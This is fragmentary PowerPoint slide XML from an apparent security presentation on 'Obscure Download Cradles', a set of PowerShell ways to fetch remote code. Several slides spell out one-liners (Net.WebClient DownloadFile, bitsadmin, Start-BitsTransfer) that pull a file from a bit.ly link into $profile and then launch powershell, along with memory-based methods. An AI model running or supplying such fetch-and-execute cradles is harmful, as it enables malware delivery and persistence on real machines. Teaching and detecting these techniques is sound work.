              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Start-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>BitsTransfer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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868922" y="2550643"/>
            <a:ext cx="9222825" cy="38472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900" dirty="0"/>
              <a:t>(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>('http://bit.ly/L3g1tCrad1e',</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$profile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/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8922" y="3713493"/>
            <a:ext cx="7052055" cy="131770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868922" y="3335435"/>
            <a:ext cx="8377737" cy="36933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 dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bitsadmin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/transfer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mydownloadjob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> /download </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>'http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>://bit.ly/L3g1t' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>profile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell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868922" y="5401824"/>
            <a:ext cx="7987886" cy="38472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900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Start-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BitsTransfer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>-Source 'http://bit.ly/L3g1t' -Destination </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>profile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1" smtClean="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900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7212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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Disk-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0" smtClean="0"/>
              <a:t>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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>BITSAdmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(deprecated - c:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>windows\system32\bitsadmin.exe)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Start-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1"/>
              <a:t>BitsTransfer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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868922" y="2550643"/>
            <a:ext cx="9222825" cy="38472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900" dirty="0"/>
              <a:t>(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>('http://bit.ly/L3g1tCrad1e',</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$profile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0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868922" y="5401824"/>
            <a:ext cx="7987886" cy="38472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900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Start-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BitsTransfer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>-Source 'http://bit.ly/L3g1t' -Destination </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>profile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1" smtClean="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill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8922" y="3711191"/>
            <a:ext cx="10070428" cy="1171234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4345" y="5786545"/>
            <a:ext cx="6617040" cy="723937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2633" y="4880565"/>
            <a:ext cx="772741" cy="92057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99007" y="5015502"/>
            <a:ext cx="73636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 smtClean="0"/>
              <a:t>CLM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/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2633" y="2801837"/>
            <a:ext cx="772741" cy="92057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99007" y="2936774"/>
            <a:ext cx="73636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 smtClean="0"/>
              <a:t>CLM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1868922" y="3335435"/>
            <a:ext cx="8377737" cy="36933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 dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bitsadmin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/transfer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mydownloadjob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> /download </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>'http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>://bit.ly/L3g1t' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>profile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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742869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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673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54555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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>/MsXml2.ServerXmlHttp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200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="6816149" y="2019760"/>
            <a:ext cx="302084" cy="779145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7234549" y="1839449"/>
            <a:ext cx="4104229" cy="1107996"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1">
